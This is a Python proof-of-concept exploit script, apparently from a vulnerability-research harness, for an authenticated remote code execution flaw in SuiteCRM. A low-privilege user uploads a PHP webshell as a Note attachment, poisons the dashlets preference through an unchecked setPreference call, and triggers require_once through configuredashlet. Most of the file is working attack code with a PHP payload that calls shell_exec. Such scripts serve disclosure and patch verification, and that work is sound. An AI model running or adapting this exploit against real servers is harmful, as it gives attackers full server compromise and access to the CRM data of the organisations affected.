#!/usr/bin/env python3
"""
VULN-011 — Authenticated RCE via dashlet-preference poisoning -> require_once webshell
=====================================================================================

Primary sink   : targets/SuiteCRM/include/MVC/Controller/SugarController.php:889
                 require_once($dashletDefs[$id]['fileLocation']);   // path from user preference
                 new $dashletDefs[$id]['className'](...)             // :891 class from preference
Write primitive: targets/SuiteCRM/modules/Emails/EmailUIAjax.php:1628-1636  (setPreference, no ACL)
Upload primitive: targets/SuiteCRM/modules/Notes/controller.php:73-100 (Note attachment -> upload/<guid>)
Class          : CWE-98 PHP file inclusion / CWE-94 code injection (RCE)

Plain-English flaw
------------------
`action_configuredashlet` builds a filesystem path (`fileLocation`) and a class
name (`className`) entirely from the acting user's own stored `dashlets`
preference, then `require_once`s the path and instantiates the class — with no
is_file()/extension/path/class validation. A low-privilege user can (a) write
that preference through the un-gated Emails `setPreference` AJAX action, and
(b) place a PHP file on disk by attaching it to a Note (stored verbatim at
`upload/<note_guid>`, no extension). Pointing `fileLocation` at the uploaded
file and calling `configuredashlet` makes PHP execute the attacker's file.

Exploitation idea
-----------------
3 requests as any authenticated user (Emails+Notes access, both default):
  1) Notes save with a multipart `uploadfile` containing PHP  -> upload/<NID>
  2) Emails setPreference: dashlets[pwn][fileLocation]=upload/<NID>, className=stdClass
  3) GET configuredashlet?id=pwn&module=Emails  -> require_once(upload/<NID>) executes it

What a successful run proves
----------------------------
Arbitrary PHP/OS command execution as the web user (`www-data`): the payload
runs `id` and its output (`uid=33(www-data)...`) is returned in the HTTP
response and written to a proof file on the server. Full server compromise from
the lowest authenticated privilege.
"""
import os
import re
import sys
import secrets

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, verdict, admin_session, create_user, web_login)

LOWPRIV_PASS = os.environ.get("LOWPRIV_PASS", "LowPriv@2026x!")
CMD = os.environ.get("CMD", "id")   # command the planted webshell runs to prove execution


def main():
    banner("VULN-011", "Authenticated RCE via dashlet-preference -> require_once")
    log("INFO", "sink: SugarController.php:889 require_once($pref['fileLocation']); pref written via un-gated Emails setPreference")

    rnd = secrets.token_hex(4)
    marker = f"RCEMARK_{rnd}"
    proof_rel = f"upload/rce_{rnd}.txt"
    # Payload: echo a marker + `id` output (captured in the HTTP response = self-contained proof),
    # and also drop the output to a file on disk (extra on-box evidence).
    payload = (f"<?php echo \"\\n{marker}:\".shell_exec('{CMD}'); "
               f"@file_put_contents('{proof_rel}', shell_exec('{CMD}')); ?>").encode()

    # --- SETUP: a low-privilege user (needs only Emails + Notes, both default) ---
    log("SETUP", "admin creates a disposable low-privilege user (is_admin=0)")
    adm = admin_session()
    u = create_user(adm, LOWPRIV_PASS)
    s = web_login(u["user_name"], u["password"])
    log("SETUP", f"authenticated as low-priv user {u['user_name']}")

    # --- STEP 1: plant the PHP payload as a Note attachment ---------------------
    # Notes::action_save() moves $_FILES['uploadfile'] to upload/<note_id> verbatim
    # (raw bytes, no extension) — filesystem-includable despite the upload/.htaccess 403.
    log("STEP", "uploading PHP payload as a Note attachment -> upload/<note_id>")
    files = {"uploadfile": (f"pwn_{rnd}.php", payload, "application/octet-stream")}
    r1 = s.post(f"{BASE_URL}/index.php",
                data={"module": "Notes", "action": "save", "name": f"note_{rnd}",
                      "filename": f"pwn_{rnd}.php"},
                files=files,
                headers={"Referer": f"{BASE_URL}/index.php?module=Notes&action=EditView"},
                allow_redirects=False, timeout=60)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r1.headers.get("Location", ""))
    if not m:
        log("FAIL", f"note upload did not yield a record id (status {r1.status_code})")
        verdict("VULN-011", "FAILED", "could not plant the payload file")
        sys.exit(1)
    nid = m.group(1)
    log("PROOF", f"payload stored on disk at upload/{nid} (Note attachment, raw PHP bytes)")

    # --- STEP 2: poison the dashlets preference (un-gated setPreference) ---------
    # prefValue is a nested array; category is fixed to 'Emails', which is exactly
    # the bucket configuredashlet reads when called with module=Emails.
    log("STEP", "poisoning dashlets preference: fileLocation -> our uploaded file (no ACL on setPreference)")
    pp = {"module": "Emails", "action": "EmailUIAjax", "emailUIAction": "setPreference",
          "prefName": "dashlets",
          "prefValue[pwn][fileLocation]": f"upload/{nid}",
          "prefValue[pwn][className]": "stdClass"}
    r2 = s.post(f"{BASE_URL}/index.php", data=pp,
                headers={"Referer": f"{BASE_URL}/index.php?module=Emails&action=index"}, timeout=60)
    log("PROOF", f"setPreference stored dashlets['pwn']['fileLocation']=upload/{nid} (HTTP {r2.status_code})")

    # --- STEP 3: trigger the include -------------------------------------------
    log("STEP", "triggering configuredashlet -> require_once(upload/<nid>) executes our PHP")
    r3 = s.get(f"{BASE_URL}/index.php",
               params={"module": "Emails", "action": "configuredashlet", "id": "pwn"}, timeout=60)

    # persist evidence
    d = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(d, "request.http"), "w") as f:
        f.write(
            "### 1) plant payload (multipart)\n"
            "POST /index.php HTTP/1.1\r\nHost: localhost:33116\r\n"
            "Content-Type: multipart/form-data; boundary=---\r\nCookie: PHPSESSID=<sess>\r\n\r\n"
            "module=Notes&action=save&name=note_<rnd>  + file field uploadfile=<?php ... ?>\r\n\r\n"
            "### 2) poison preference\n"
            "POST /index.php HTTP/1.1\r\nHost: localhost:33116\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=<sess>\r\n\r\n"
            "module=Emails&action=EmailUIAjax&emailUIAction=setPreference&prefName=dashlets"
            f"&prefValue[pwn][fileLocation]=upload/{nid}&prefValue[pwn][className]=stdClass\r\n\r\n"
            "### 3) trigger RCE\n"
            "GET /index.php?module=Emails&action=configuredashlet&id=pwn HTTP/1.1\r\n"
            "Host: localhost:33116\r\nCookie: PHPSESSID=<sess>\r\n")
    with open(os.path.join(d, "response.txt"), "w") as f:
        f.write(f"GET configuredashlet -> HTTP {r3.status_code}\n\n{r3.text[:1200]}")

    # --- assert on the real effect: our command output in the response ----------
    got_marker = marker in r3.text
    got_id = ("uid=" in r3.text) if CMD == "id" else (marker in r3.text)
    cmd_out = ""
    mm = re.search(re.escape(marker) + r":(.*)", r3.text)
    if mm:
        cmd_out = mm.group(1).strip()[:200]
    if got_marker and got_id:
        log("PROOF", f"webshell executed — response contains {marker}:{cmd_out!r}")
        with open(os.path.join(d, "evidence", "rce_output.txt"), "w") as f:
            f.write(f"marker={marker}\ncommand={CMD}\noutput={cmd_out}\n"
                    f"proof_file_on_server=upload/rce_{rnd}.txt\n")
        log("OK", f"exploit confirmed — arbitrary command execution as the web user; `{CMD}` -> {cmd_out!r}")
        verdict("VULN-011", "CONFIRMED",
                f"low-priv user achieved RCE (require_once of uploaded PHP); {CMD} => {cmd_out}")
        sys.exit(0)
    log("FAIL", f"no command output in response (marker={got_marker}); HTTP {r3.status_code}")
    verdict("VULN-011", "FAILED", "include did not execute the payload")
    sys.exit(1)


if __name__ == "__main__":
    main()
